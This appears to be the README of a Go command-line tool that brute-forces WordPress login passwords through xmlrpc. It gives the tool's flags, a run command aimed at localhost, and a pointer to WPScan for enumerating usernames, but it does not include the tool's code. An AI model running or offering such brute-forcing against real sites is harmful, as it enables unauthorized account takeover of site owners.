# WordPress XMLRPC Exploit

> Brute-force a WordPress website user login credentials

## Usage

```md
Usage of ./main:
  -dict string
        A text dictionary containing passwords to try (default "dict.txt")
  -routines int
        Maximum number of Goroutines to spawn (default 10)
  -url string
        URL to WordPress website to target (without trailing /) (default "https://www.wordpress-site.com")
  -user string
        Username to brute-force (default "admin")

```

### Where do I get the Website Usernames?

You can use the excellent [WPScan](https://github.com/wpscanteam/wpscan) to Enumerate username for any vulnerable WordPress website.

## Compilation & Execution
```bash
$ make build
$ ./args -dict ./dict/dict.txt -url "http://localhost:8000" -user "admin" -routines 5
```
